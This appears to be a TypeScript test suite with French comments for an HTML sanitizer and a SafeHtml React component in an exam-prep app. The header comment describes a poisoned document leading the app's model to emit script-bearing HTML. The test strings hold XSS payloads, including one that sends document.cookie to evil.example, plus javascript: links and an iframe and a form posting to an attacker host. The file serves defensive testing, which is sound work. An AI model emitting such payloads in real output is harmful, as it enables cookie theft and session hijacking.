import assert from "node:assert/strict";
import fs from "node:fs";
import path from "node:path";
import { test } from "node:test";
import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";

/**
 * B4 — Le HTML produit par le modèle (drills, questions ouvertes des mocks)
 * est affiché tel quel dans le DOM : un document piégé pouvait faire générer
 * `<img onerror=…>`. Tout HTML de provenance modèle/utilisateur passe par un
 * sanitizer allow-list, et par UN SEUL composant — aucun autre
 * dangerouslySetInnerHTML ne doit exister dans l'interface.
 */

const ROOT = path.resolve(__dirname, "..");

test("sanitizeHtml : scripts, handlers et URL javascript: disparaissent, le HTML simple reste", async () => {
  const { sanitizeHtml } = await import("../lib/sanitize-html");
  const dirty = [
    `<p>Calculer <code>n log n</code>.</p>`,
    `<img src=x onerror="fetch('https://evil.example/?c='+document.cookie)">`,
    `<script>alert(1)</script>`,
    `<a href="javascript:alert(1)">lien</a>`,
    `<div onclick="alert(1)" style="position:fixed">x</div>`,
    `<table><tr><td colspan="2">ok</td></tr></table>`,
    `<iframe src="https://evil.example"></iframe><object data="x"></object>`,
    `<svg><use href="data:image/svg+xml;base64,PHN2Zz4="/></svg>`,
    `<form action="https://evil.example"><input name="pw"></form>`,
  ].join("");
  const out = sanitizeHtml(dirty);
  assert.match(out, /<p>Calculer <code>n log n<\/code>\.<\/p>/);
  assert.match(out, /<td colspan="2">ok<\/td>/);
  for (const bad of ["onerror", "<script", "javascript:", "onclick", "<iframe", "<object", "<svg", "<form", "<input", "<img", "style="]) {
    assert.ok(!out.toLowerCase().includes(bad), `« ${bad} » a survécu : ${out}`);
  }
});

test("sanitizeHtml : entrée vide ou non-chaîne → chaîne vide (jamais d'exception)", async () => {
  const { sanitizeHtml } = await import("../lib/sanitize-html");
  assert.equal(sanitizeHtml(""), "");
  assert.equal(sanitizeHtml(null as unknown as string), "");
  assert.equal(sanitizeHtml(undefined as unknown as string), "");
});

test("SafeHtml : le composant rend le HTML assaini (rendu serveur compris)", async () => {
  const { SafeHtml } = await import("../components/ui/SafeHtml");
  const html = renderToStaticMarkup(
    createElement(SafeHtml, { html: `<p>ok</p><img src=x onerror=alert(1)>`, className: "prose-exam" })
  );
  assert.match(html, /class="prose-exam"/);
  assert.match(html, /<p>ok<\/p>/);
  assert.ok(!html.includes("onerror"), html);
});

test("aucun dangerouslySetInnerHTML hors du composant SafeHtml", () => {
  const offenders: string[] = [];
  const walk = (dir: string) => {
    for (const e of fs.readdirSync(dir, { withFileTypes: true })) {
      if (e.name.startsWith(".") || e.name === "node_modules") continue;
      const p = path.join(dir, e.name);
      if (e.isDirectory()) { walk(p); continue; }
      if (!/\.(tsx?|jsx?)$/.test(e.name) || / \d\.tsx?$/.test(e.name)) continue;
      if (p.endsWith(path.join("components", "ui", "SafeHtml.tsx"))) continue;
      const src = fs.readFileSync(p, "utf8");
      if (src.includes("dangerouslySetInnerHTML")) offenders.push(path.relative(ROOT, p));
    }
  };
  for (const d of ["app", "components", "lib"]) walk(path.join(ROOT, d));
  assert.deepEqual(offenders, [], `HTML injecté sans sanitizer : ${offenders.join(", ")}`);
});
